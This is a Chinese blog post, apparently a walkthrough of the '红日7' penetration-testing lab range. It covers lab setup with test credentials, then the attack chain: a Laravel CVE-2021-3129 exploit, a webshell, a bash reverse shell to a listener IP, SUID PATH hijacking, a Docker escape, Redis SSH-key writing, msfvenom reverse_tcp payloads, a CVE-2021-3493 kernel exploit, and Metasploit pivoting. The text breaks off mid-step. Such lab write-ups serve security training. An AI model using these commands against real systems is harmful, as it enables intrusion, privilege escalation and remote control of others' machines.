

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/logo.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="永安寺">
  <meta name="keywords" content="">
  
  <title>红日7 - Victory</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="红日7">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      永安寺
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-30 14:25" pubdate>
        2021年10月30日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      43
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">红日7</h1>
            
            <div class="markdown-body">
              <ul>
<li><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图<img src="https://api2.mubu.com/v3/document_image/0ab4d441-cfe7-4ead-b4e7-942d60e0bea9-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></h2></li>
<li><p>环境配置</p>
<ul>
<li><p>DMZ区IP段为192.168.43.1/24  因为我这里是开热点打的  图用的网上的</p>
</li>
<li><p>第二层网络环境IP段为192.168.52.1/24</p>
</li>
<li><p>第三层网络环境IP段为192.168.93.1/24</p>
</li>
<li><p>DMZ区域</p>
<ul>
<li>Ubuntu（Web 1）配置了两个网卡，一个桥接可以对外提供服务，IP段设为 192.168.43.0/24，一个连接在 VMnet8 上，设为NAT模式，IP段设为 192.168.52.0/24 连通第二层网络</li>
</ul>
</li>
<li><p>第二层网络区域</p>
<ul>
<li>Ubuntu（Web 2）和 Windows 7（PC 1）都配置了两个网卡，一个连接在 VMnet8 上连通第二层网络，一个连接在 VMnet14 上，设为仅主机模式，IP段设为 192.168.93.0/24 连通第三层网络</li>
</ul>
</li>
<li><p>第三层网络区域</p>
<ul>
<li>Windows Server 2012 和 Windows 7（PC 2）都只配置了一个网卡，连接在 VMnet14 上连通第三层网络</li>
</ul>
</li>
<li><p>用户名密码</p>
<ul>
<li><p>域用户账户和密码如下：</p>
<ul>
<li><p>Administrator：Whoami2021</p>
</li>
<li><p>whoami：Whoami2021</p>
</li>
<li><p>bunny：Bunny2021</p>
</li>
<li><p>moretz：Moretz2021</p>
</li>
</ul>
</li>
<li><p>Ubuntu 1：</p>
<ul>
<li>web：web2021</li>
</ul>
</li>
<li><p>Ubuntu 2：</p>
<ul>
<li>ubuntu：ubuntu</li>
</ul>
</li>
<li><p>通达OA账户（不重要）：</p>
<ul>
<li>admin：admin657260</li>
</ul>
</li>
</ul>
</li>
<li><p>后面的网卡设置好就行<img src="https://api2.mubu.com/v3/document_image/0ffa7885-4057-4958-ba2c-82b9dc9a6d72-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/8524599a-b22e-4362-bc3d-50087ec92504-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>网络配置好了 还需要配置服务</p>
<ul>
<li><p>DMZ区的 Ubuntu 需要启动redis和nginx服务（经过后面的心酸，这里的redis得用root权限启动）：</p>
<ul>
<li><p>sudo su</p>
</li>
<li><p>redis-server /etc/redis.conf</p>
</li>
<li><p>/usr/sbin/nginx -c /etc/nginx/nginx.conf</p>
</li>
<li><p>iptables -F</p>
</li>
</ul>
</li>
<li><p>第二层网络的 Ubuntu需要启动docker容器（仍然需要root）：</p>
<ul>
<li><p>sudo su</p>
</li>
<li><p>service docker start</p>
</li>
<li><p>docker start 8e172820ac78</p>
</li>
</ul>
</li>
<li><p>第二层网络的 Windows 7 （PC 1）需要启动通达OA（这个得用administrator启动哦，并且要关闭防火墙）：</p>
<ul>
<li>C:\MYOA\bin\AutoConfig.exe</li>
</ul>
</li>
<li><p>开始配置<img src="https://api2.mubu.com/v3/document_image/a8a03216-3bc4-4008-9f04-ff43c74cb0b0-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/76e130ea-f7f1-4a2a-8e99-5b8ac27823f3-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/a6a6ab8e-0700-45d6-9d40-49b8b8e8e51a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/60f55f3c-f7b9-4f7d-ac5d-45576eba5c4f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/b5a024b9-365f-4494-b793-e8823ddfaca7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/438093c2-d3fa-4726-bde1-b574b6ab35a3-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/51c403de-e3bf-4a78-ae79-c201d793ba7b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>至此 环境配置完成</p>
</li>
</ul>
</li>
</ul>
</li>
<li><h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><ul>
<li><h3 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h3></li>
<li><p>拿到DMZ的ip：192.168.43.129  首先打开看看<img src="https://api2.mubu.com/v3/document_image/6149f886-b4cc-492d-ab9e-6472749e89d8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>空白啥都没有 但是网上的那些有blog不知道怎么回事 先不管 扫端口</p>
<ul>
<li>命令：nmap -T4 -A 192.168.31.132 -p 1-65535</li>
</ul>
</li>
<li><p>扫出4个端口</p>
<ul>
<li><p>22的ssh</p>
</li>
<li><p>80的nginx</p>
</li>
<li><p>81的Laravel</p>
</li>
<li><p>6379的redis</p>
</li>
</ul>
</li>
<li><p>因为80没东西 所以打开81看看<img src="https://api2.mubu.com/v3/document_image/bc53168d-600d-4663-bbbc-67cc79b4f026-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>是一个Laravel v8.29.0（一个简洁、开源的 PHP Web 开发框架）</p>
</li>
<li><p>直接网上找找公开漏洞</p>
</li>
<li><p>发现是有漏洞的CVE-2021-3129 然后直接找exp打</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
</li>
<li><p>克隆exp到kali</p>
<ul>
<li>命令：git clone git://<a target="_blank" rel="noopener" href="http://github.com/crisprss/Laravel_CVE-2021-3129_EXP.git">github.com/crisprss/Laravel_CVE-2021-3129_EXP.git</a> </li>
</ul>
</li>
<li><p>然后将里面默认的url改为目标192.168.43.129<img src="https://api2.mubu.com/v3/document_image/3f49205e-0c3d-4e59-8d33-d13d7e5eb998-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后克隆phpggc到exp目录下 因为需要同目录<img src="https://api2.mubu.com/v3/document_image/49b884bf-81e7-4056-97cf-3e15d8dd53ce-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p> 命令：git clone git://<a target="_blank" rel="noopener" href="http://github.com/ambionics/phpggc.git">github.com/ambionics/phpggc.git</a> </p>
</li>
<li><p>然后执行命令：python3 exploit.py<img src="https://api2.mubu.com/v3/document_image/d724b4b0-863d-4b65-a906-057a540ae43c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后改一下py脚本 改成任意执行命令</p>
</li>
<li><p>Vim打开脚本，首先在exploit.py开头import sys库 <img src="https://api2.mubu.com/v3/document_image/fbf5061b-b018-45d0-b3f1-7483fdf3c2b8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>主函数改为如下内容（注意缩进）</p>
</li>
<li><p>args = sys.argv</p>
</li>
<li><p>url = args[1]</p>
</li>
<li><p>command = args[2]</p>
</li>
<li><p>Exp(url, command) <img src="https://api2.mubu.com/v3/document_image/053c9894-12c6-4188-833d-504ecb4d9a1e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后执行命令<img src="https://api2.mubu.com/v3/document_image/7dc61f89-c3d4-4127-b44c-5a2c5b99776d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后写shell  但是用这个exp一直写不上 就换了一个exp </p>
</li>
<li><p>直接写shell的 <img src="https://api2.mubu.com/v3/document_image/d0d9b178-3707-47b9-bb5d-d161cfdd2e47-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后用哥斯拉链接2.92版本的  3.03不知道为什么连不上</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)">https://github.com/BeichenDream/Godzilla下载地址![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)</a></li>
</ul>
</li>
<li><p>连上shell<img src="https://api2.mubu.com/v3/document_image/78756e96-47c7-4cb8-b923-e9aeef82a494-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>首先判断当前环境和权限  发现有些命令无法执行 怀疑是在容器里面</p>
</li>
<li><p>判断是否为docker<img src="https://api2.mubu.com/v3/document_image/b1e6a315-d306-4a61-9e57-ddbe15673d57-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>确实是在docker里面  所以就需要进行docker逃逸</p>
</li>
<li><p>但是当前权限较低<img src="https://api2.mubu.com/v3/document_image/a7ca5173-823c-4dee-b3e5-78f8e7b2c218-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>所以需要进行提权 先通过命令来搜索具有SUID或4000权限的文件：</p>
<ul>
<li>find / -perm -u=s -type f 2&gt;/dev/null<img src="https://api2.mubu.com/v3/document_image/e280d9c1-1dcb-4c2a-87c3-75578f8aef60-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></li>
</ul>
</li>
<li><p>发现 /home/jobs/shell 文件比较特别  然后切换到目录看看 </p>
</li>
<li><p>但是发现在哥斯拉执行的时候切换不了 不知道什么情况 那就先弹个会话到kali</p>
<ul>
<li>命令：bash -c “bash -i &gt;&amp; /dev/tcp/192.168.43.35/1234 0&gt;&amp;1”</li>
</ul>
</li>
<li><p>然后在kali上试试能不能行<img src="https://api2.mubu.com/v3/document_image/6cf4aac4-9164-4005-900d-36ca6ab2c56c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后通过查看demo.c文件发现 是调用的ps命令且并未使用绝对路径<img src="https://api2.mubu.com/v3/document_image/d3a264f7-1916-478a-af08-05bfe78a23c6-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>那么尝试更改$PATH来执行恶意程序，从而获得目标主机的 root 权限 shell</p>
<ul>
<li><p>cd /tmp</p>
</li>
<li><p>echo “/bin/bash” &gt; ps</p>
</li>
<li><p>chmod 777 ps</p>
</li>
<li><p>echo $PATH</p>
</li>
<li><p>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</p>
</li>
<li><p>cd /home/jobs</p>
</li>
<li><p>./shell# 然后就获得了root权限，可以执行命令了</p>
</li>
</ul>
</li>
<li><p>然后先弹个root的会话<img src="https://api2.mubu.com/v3/document_image/46df80e3-c622-4a2d-921b-1e195cd654c1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后使用特权模式进行docker逃逸</p>
<ul>
<li><p>先fdisk -l查看磁盘挂载<img src="https://api2.mubu.com/v3/document_image/8150dc0b-8819-462e-97d2-7c2aaefdfd89-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上<img src="https://api2.mubu.com/v3/document_image/345a0738-4500-4f0a-a414-2e980f86cbc8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后ls hack就可以看到宿主机部分文件<img src="https://api2.mubu.com/v3/document_image/d6cf4391-335a-40dc-8bcf-5cabb4e4bce7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>来到/hack/home/ubuntu下 可以看到有.ssh文件<img src="https://api2.mubu.com/v3/document_image/43dd5919-f695-4f38-ba20-bff005a23c1a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>那就可以写入密钥</p>
</li>
<li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/404f1c8f-af9c-4103-b671-e244711e3722-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/d758c35f-8167-4a8e-814f-bcfda4ebc79e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将密钥复制</p>
</li>
<li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/08240270-a730-4788-abb3-9b25ec86598c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>命令：cp -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys(我这里是切换到.ssh目录下复制的 因为我直接全路径不知道为什么失败)(后来发现是hack前面不需要/)</p>
</li>
<li><p>然后写入到authorized_keys里面<img src="https://api2.mubu.com/v3/document_image/3dd70c5a-6e2f-4efe-887d-bf7797d28e5e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后用kali连接ubuntu</p>
</li>
<li><p>但是发现还是需要密码 这就奇怪了<img src="https://api2.mubu.com/v3/document_image/7d9ca86d-79da-48e6-bf4f-eb4a176cffc7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后换思路 因为发现还有6379 有redis 所以从redis搞</p>
</li>
</ul>
</li>
<li><p>redis未授权</p>
<ul>
<li><p>先安装redis-cli工具</p>
<ul>
<li><p>wget <a target="_blank" rel="noopener" href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a></p>
</li>
<li><p>tar -zxvf redis-stable.tar.gz</p>
</li>
<li><p>cd redis-stable</p>
</li>
<li><p>make //全局生效 </p>
</li>
<li><p>cp src/redis-cli /usr/bin/</p>
</li>
</ul>
</li>
<li><p>然后连接</p>
<ul>
<li>redis-cli -h 192.168.43.129<img src="https://api2.mubu.com/v3/document_image/ddbf17f9-6b08-421f-943d-56c93d24988d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></li>
</ul>
</li>
<li><p>尝试用redis写入ssh公钥</p>
<ul>
<li><p>kali生成ssh公钥</p>
<ul>
<li>ssh-keygen -t rsa</li>
</ul>
</li>
<li><p>将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里：</p>
<ul>
<li><p>(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p>
</li>
<li><p>cat key.txt | redis-cli -h 192.168.43.129 -x set hello</p>
</li>
</ul>
</li>
<li><p>然后进入redis将公钥写入（这里redis要是不用root启，就不行）</p>
<ul>
<li><p>config set dir /root/.ssh                #设置redis的备份路径为/root/.ssh/</p>
</li>
<li><p>config set dbfilename authorized_keys    #设置保存文件名为authorized_keys</p>
</li>
<li><p>save        #将数据保存在目标服务器硬盘上</p>
</li>
<li><p>ssh 192.168.213.188                      #连接     <img src="https://api2.mubu.com/v3/document_image/58e81d3e-52e8-4498-9bf5-de8d9740be02-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/953b5607-78d6-492d-b7a7-da89a3d12a85-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>直接连上了</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>docker逃逸失败的原因</p>
<ul>
<li><p>因为开始确确实实是把ssh公钥写入了 但是怎么会连不上哎 然后查看了下nginx的配置<img src="https://api2.mubu.com/v3/document_image/d3397343-245d-48d4-a485-8ac83face579-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现了 nginx 反向代理的标志 proxy_pass</p>
</li>
<li><p>攻击的机器192.168.43.129（192.168.52.10）服务器上的 nginx 将 81 端口收到的请求转发给了 192.168.52.20，将 80 端口收到的请求转发给了 <a target="_blank" rel="noopener" href="http://whoamianony.top/">http://whoamianony.top</a></p>
</li>
<li><p>所以这个docker的宿主机的192.168.20.20上 就算公钥写进去了 但是连不上 不在同一个网段 那个是</p>
</li>
<li><p>如果说192.168.43.129(192.168.52.10)是A机器  192.168.52.20是B机器  docker是B1</p>
</li>
<li><p>那么我们开始用马子拿下的就是B中的B1  redis拿下的才是A </p>
</li>
</ul>
</li>
<li><p>docker再次逃逸（柳暗花明）</p>
<ul>
<li><p>还是先把这个上线msf 以便后续操作</p>
</li>
<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=3333 -f elf &gt; web.elf<img src="https://api2.mubu.com/v3/document_image/ae4a6dfb-37cb-4638-bd3a-90a808f6e17c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后远程下载马子<img src="https://api2.mubu.com/v3/document_image/3837ff79-a495-4d49-bc70-5f2b2c80086b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后msf开启监听</p>
<ul>
<li><p>use exploit/multi/handler</p>
</li>
<li><p>set lhost 192.168.31.96</p>
</li>
<li><p>set lport 3333</p>
</li>
<li><p>set payload linux/x86/meterpreter/reverse_tcp</p>
</li>
<li><p>run</p>
</li>
</ul>
</li>
<li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/77a895b0-777d-4d34-a257-1ca4f8cad031-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>因为开始第一步我们就将公钥写进去192.168.50.20了  是不是我们可以直接将kali的公钥下载到拿下的A机器 然后直接连接  但是还是要输入密码 很奇怪 按道理我看网上的有人是可以成功的 这里我没成功 就不管了<img src="https://api2.mubu.com/v3/document_image/cbcf319a-8540-4a39-8fdd-a1616619ee41-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后我重新试了一下 还是成功连上了  可能是因为我第一天关机了原因  <img src="https://api2.mubu.com/v3/document_image/440f5e8a-476f-4f30-8bde-cd1b3db0a12f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>重新通过第一步的shell写密钥到192.168.52.20上 然后下载kali的公钥连接上了</p>
</li>
<li><p>这里既然连接上了 就不用另一种方法了</p>
</li>
<li><p>但还是介绍一下另一种方法</p>
</li>
<li><p>我们通过redis拿下了192.168.43.129(192.168.52.10)这一台  这一台和192.168.52.20 有共同的网段的是可以直接连的   所以就可以通过shell弹一个会话到43.129这一台机器上 然后在这一台机器上进行docker提权以及 特权模式逃逸  直接在129这一台机器上生成密钥 然后写入到52.20中 然后连接进行逃逸</p>
</li>
</ul>
</li>
<li><p>所以到现在已经拿下了两台</p>
<ul>
<li><p>拿到了web，192.168.43.129；192.168.52.10</p>
</li>
<li><p>拿到了ubuntu，192.168.52.20；192.168.93.10</p>
</li>
</ul>
</li>
<li><p>但192.168.52.20是ubuntu用户权限不高 我们要得肯定是root最好 先进行信息收集看看能不能提权<img src="https://api2.mubu.com/v3/document_image/44ee80bb-7863-4db2-b671-216145e2205a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>14.04 刚好上次打靶场的时候遇到 这个版本可以提权用<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
</li>
<li><p>漏洞利用 exp 下载地址：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
</li>
<li><p>漏洞影响版本：</p>
<ul>
<li><p>Ubuntu 20.10</p>
</li>
<li><p>Ubuntu 20.04 LTS</p>
</li>
<li><p>Ubuntu 18.04 LTS</p>
</li>
<li><p>Ubuntu 16.04 LTS</p>
</li>
<li><p>Ubuntu 14.04 ESM</p>
</li>
</ul>
</li>
<li><p>直接将下载的exp的内容复制到 这台机器编译一个</p>
<ul>
<li><p>cd /tmp</p>
</li>
<li><p>vim exploit.c             #将下载的exploit.c内容粘贴到该文件中</p>
</li>
<li><p>gcc exploit.c -o exploit</p>
</li>
<li><p>chmod +x exploit</p>
</li>
<li><p>./exploit<img src="https://api2.mubu.com/v3/document_image/8d4f132a-7877-4c3a-ba4e-1797418f1ecc-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>提权成功  然后现在上线msf进行内网渗透</p>
</li>
</ul>
</li>
<li><p>先添加一个路由 这台是192.168.43.129<img src="https://api2.mubu.com/v3/document_image/93e263a0-d090-47a2-bb42-01d28ede90fb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后生成一个马子 </p>
<ul>
<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=4445 -f elf &gt; ubuntu.elf</p>
</li>
<li><p>然后远程下载 发现是可以下载的 说明可以出网</p>
</li>
<li><p>如果这里不能出网的话就需要通过先把马子传到192.168.43.129上 然后在下载到52.20这一台上 这也的话 马子也需要重新生成 设置代理</p>
</li>
</ul>
</li>
<li><p>然后下载执行上线<img src="https://api2.mubu.com/v3/document_image/48b36eca-fea8-47f8-ae1c-ee639471ed27-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>好了现在都上线了 开启socks代理探测内网</p>
</li>
<li><h3 id="第二层内网渗透"><a href="#第二层内网渗透" class="headerlink" title="第二层内网渗透"></a>第二层内网渗透</h3><ul>
<li><p>首先扫描一下第二层网络（192.168.52.0/24）是否有存活 windows 主机</p>
<ul>
<li><p>use auxiliary/scanner/discovery/udp_probe</p>
</li>
<li><p>set rhosts 192.168.52.1-255</p>
</li>
<li><p>set threads 5</p>
</li>
<li><p>run<img src="https://api2.mubu.com/v3/document_image/b5bcc847-38ac-4ed6-adcd-66c7b6eb4433-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现了一台30的机器 </p>
</li>
</ul>
</li>
<li><p>直接挂socks 进一步探测信息</p>
<ul>
<li><p>use auxiliary/server/socks_proxy</p>
</li>
<li><p>set srvhost 192.168.43.35</p>
</li>
<li><p>set version 4a socks版本   </p>
</li>
<li><p> run    <img src="https://api2.mubu.com/v3/document_image/7dbe4a44-bdbe-4c3f-b862-28dc71692310-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>发现有个8080端口 然后浏览器开启代理打开看看<img src="https://api2.mubu.com/v3/document_image/eb5e2224-3149-40e0-8425-149cfb28f0f1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/98d547fe-caea-488a-9ca1-a74c67f8f342-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现是一个通达OA V11.3  然后直接通过exp直接上<img src="https://api2.mubu.com/v3/document_image/5df73035-fc26-4e73-b9aa-42c05db9fe70-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>上工具，这个工具有个坑，有个获取cookie的功能但是获取不了，只有自己去网页上粘cookie过来。成功获取到了shell       <img src="https://api2.mubu.com/v3/document_image/4ca31aad-7626-4f37-95f6-745395b306d0-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后上线msf </p>
<ul>
<li><p> use exploit/multi/script/web_delivery</p>
</li>
<li><p>set target 2</p>
</li>
<li><p>set payload windows/x64/meterpreter/reverse_tcp</p>
</li>
<li><p>set lhost 192.168.43.35</p>
</li>
<li><p>set lport 5555</p>
</li>
